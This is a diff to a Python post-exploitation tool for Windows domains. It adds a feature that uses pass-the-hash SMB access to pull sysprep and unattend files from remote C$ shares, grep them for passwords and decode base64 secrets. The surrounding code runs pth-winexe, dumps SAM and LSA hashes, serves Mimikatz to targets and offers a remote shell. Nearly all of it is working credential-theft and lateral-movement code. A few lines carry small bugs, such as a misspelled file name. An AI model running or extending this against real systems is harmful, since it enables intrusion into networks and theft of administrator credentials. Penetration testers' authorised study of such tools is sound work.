@@ -4,7 +4,7 @@
 # Released under Apache V2 see LICENCE for more information
 
 import os, argparse, signal, sys, re, binascii, subprocess, string, SimpleHTTPServer, multiprocessing, SocketServer
-import socket, fcntl, struct, time
+import socket, fcntl, struct, time, base64
 
 import ldap # run 'pip install python-ldap' to install ldap module.
 
@@ -33,6 +33,7 @@ from threading import Thread
 from impacket.smbconnection import *
 from random import randint
 from base64 import b64encode
+from base64 import b64decode
 
 #####
 from impacket.dcerpc.v5.rpcrt import DCERPC_v5
@@ -73,7 +74,6 @@ def d2b(a):
 		for x in xrange(6 - len(t2bin)):
 			t2bin.insert(0, 0)
 	return ''.join([str(g) for g in t2bin])
-
 
 def convert(low, high, lockout=False):
     time = ""
@@ -116,7 +116,6 @@ def convert(low, high, lockout=False):
     elif minutes == 1:
     	time += "{0} minute ".format(minutes)
     return time
-
 
 class SAMRDump:
     KNOWN_PROTOCOLS = {
@@ -248,7 +247,6 @@ class SAMRDump:
         print("\t[+] Account Lockout Threshold: {0}".format(self.__accnt_lock_thres))
         print("\t[+] Forced Log off Time: {0}".format(self.__force_logoff_time))
 
-
 def gppdecrypt(cpassword_pass):
 	#Original code taken from the resource below.
 	#https://github.com/leonteale/pentestpackage/blob/master/Gpprefdecrypt.py
@@ -324,7 +322,6 @@ def datadump(user, passw, host, path, os_version):
 		print colored("[+]Exiting as other features will not work at the minute with this configuration, Sorry!!: ",'yellow')
 		exit(1)
 
-
 	return_value=os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --system \/\/"+host+" \"cmd.exe /C \" 2>/dev/null")
 	signal_number = (return_value & 0x0F)
 	if not signal_number:
@@ -359,6 +356,7 @@ def datadump(user, passw, host, path, os_version):
 					os.system(creddump7path+"pwdump.py "+path+host+"/system "+path+host+"/sam | tee "+path+host+"/pwdump")
 			except OSError:
 				print colored("[-]Something went wrong extracting from pwdump: "+host,'red')
+			
 			if skiplsacache in noanswers:
 				try:
 					print colored("[+]getting remote version: "+host,'green')
@@ -507,7 +505,6 @@ def datadump(user, passw, host, path, os_version):
 						if len(stdout_value)>0:
 							break
 
-
 					my_ip=get_ip_address('eth0')
 					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
 					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
@@ -611,7 +608,6 @@ def datadump(user, passw, host, path, os_version):
 						stdout_value = proc.communicate()[0]
 						if len(stdout_value)>0:
 							break
-
 
 					my_ip=get_ip_address('eth0')
 					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
@@ -810,6 +806,91 @@ def datadump(user, passw, host, path, os_version):
 				except OSError:
 					print colored("[-]Something went wrong running screenshot...",'red')
 
+			if unattend in yesanswers:
+				
+				try:
+					print colored("[+]Attempting to Find Unattend/Sysprep Files",'green')
+					
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.inf\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory sysprep -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get sysprep.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get unattend.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
+					proc = subprocess.Popen("/usr/bin/pth-smbclient //"+host+"/c$ --directory windows/panther/unattend -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get Unattended.xml\' 2>/dev/null", stdout=subprocess.PIPE,shell=True)		
+
+					if os.path.isfile(outputpath+host+"/unattend.xml"):
+						print colored("[+]unattend.xml file found, grepping for username, password, group",'green')
+						
+						os.chdir(outputpath+host)
+												
+						os.system("grep --color='auto' -i \"<Password>\" unattend.xml")
+						os.system("grep --color='auto' -i \"<Username>\" unattend.xml")
+						os.system("grep --color='auto' -i \"<Name>\" unattend.xml")
+						os.system("grep --color='auto' -i \"<Group>\" unattend.xml")
+						
+						os.system("grep --color='auto' -i \"=</Value>\" unattend.xml > unattend_b64values.txt")
+
+						if os.path.isfile(outputpath+host+"/unattend_b64values.txt"):
+							print colored("\n[+]Decoding Base64 Encoded Values",'green')
+							with open(outputpath+host+"/unattend_b64values.txt") as f:
+								content = f.readlines()
+							
+							for x in content:
+								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')
+
+					if os.path.isfile(outputpath+host+"/Unattended.xml"):
+						print colored("[+]Unattended.xml file found, grepping for username, password, group",'green')
+						
+						os.chdir(outputpath+host)
+					
+						os.system("grep --color='auto' -i \"<Password>\" Unattendedxml")
+						os.system("grep --color='auto' -i \"<Username>\" Unattended.xml")
+						os.system("grep --color='auto' -i \"<Name>\" Unattended.xml")
+						os.system("grep --color='auto' -i \"<Group>\" Unattended.xml")
+
+						os.system("grep --color='auto' -i \"=</Value>\" Unattended.xml > unattended_b64values.txt")
+
+						if os.path.isfile(outputpath+host+"/unattended_b64values.txt"):
+							print colored("\n[+]Decoding Base64 Encoded Values",'green')
+							with open(outputpath+host+"/unattended_b64values.txt") as f:
+								content = f.readlines()
+							
+							for x in content:
+								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')
+
+
+					if os.path.isfile(outputpath+host+"/sysprep.xml"):
+						print colored("[+]sysprep.xml file found, grepping for username, password, group",'green')
+						
+						os.chdir(outputpath+host)
+					
+						os.system("grep --color='auto' -i \"<Password>\" sysprep.xml")
+						os.system("grep --color='auto' -i \"<Username>\" sysprep.xml")
+						os.system("grep --color='auto' -i \"<Name>\" sysprep.xml")
+						os.system("grep --color='auto' -i \"<Group>\" sysprep.xml")
+
+						os.system("grep --color='auto' -i \"=</Value>\" sysprep.xml > sysprep_b64values.txt")
+
+						if os.path.isfile(outputpath+host+"/sysprep_b64values.txt"):
+							print colored("\n[+]Decoding Base64 Encoded Values",'green')
+							with open(outputpath+host+"/sysprep_b64values.txt") as f:
+								content = f.readlines()
+							
+							for x in content:
+								print "B64 Value "+ colored(x.strip()[7:-8],'yellow') + " decodes to " + colored(base64.b64decode(x.strip()[7:-8]),'yellow')
+
+
+					if os.path.isfile(outputpath+host+"/sysprep.inf"):
+						print colored("[+]sysprep.xml file found",'green')
+						
+						os.chdir(outputpath+host)
+					
+						os.system("grep --color='auto' -i AdminPassword sysprep.inf")
+				
+
+				except OSError:
+					print colored("[-]Something went wrong running looking for files...",'red')
+
+
 def signal_handler(signal, frame):
 		print colored("\nCtrl+C pressed.. aborting...",'red')
 		sys.exit()
@@ -857,7 +938,7 @@ def get_local_admins(ip,username,password,domain):
 	else:
 		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net localgroup administrators' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 		stdout_value = proc.communicate()[0]
-		if username in stdout_value:
+		if username.upper() in stdout_value.upper():
 			LocalAdmin = True
 		
 	return LocalAdmin	
@@ -874,7 +955,7 @@ def get_domain_admins(ip,username,password,domain):
 		proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain+"\\"+username+"%"+password+"\" --uninstall --system \/\/"+ip+" 'net group \"Domain Admins\" /domain' 2>/dev/null", stdout=subprocess.PIPE,shell=True)	
 		stdout_value = proc.communicate()[0]
 		
-		if username in stdout_value:
+		if username.upper() in stdout_value.upper():
 			DomainAdmin = True
 		
 	return DomainAdmin	
@@ -1226,6 +1307,7 @@ p.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", he
 p.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", help="<Optional> Enter y to skip dumping lsa and cache and go straight to hashes!!")
 # Utilities
 p.add_argument("-uP", "--policiesscripts_dump", dest="policiesscripts_dump", default="n", help="<Optional> Enter y to Dump Policies and Scripts folder from a Domain Controller")
+p.add_argument("-uU", "--unattend", dest="unattend", default="n", help="<Optional> Enter y to look for and grap unattended installation files")
 p.add_argument("-uG", "--c_password", dest="c_password", default="", help="<Optional> Decrypt GPP Cpassword")
 p.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 p.add_argument("-uX", "--xcommand", dest="xcommand", default="n", help="<Optional> Run custom command")
@@ -1308,6 +1390,7 @@ system_tasklist=args.system_tasklist
 multi_rdp=args.multi_rdp
 edq_SingleSessionPerUser=args.edq_SingleSessionPerUser
 screenshot=args.screenshot
+unattend=args.unattend
 
 if lat in yesanswers:
 	WriteLAT()
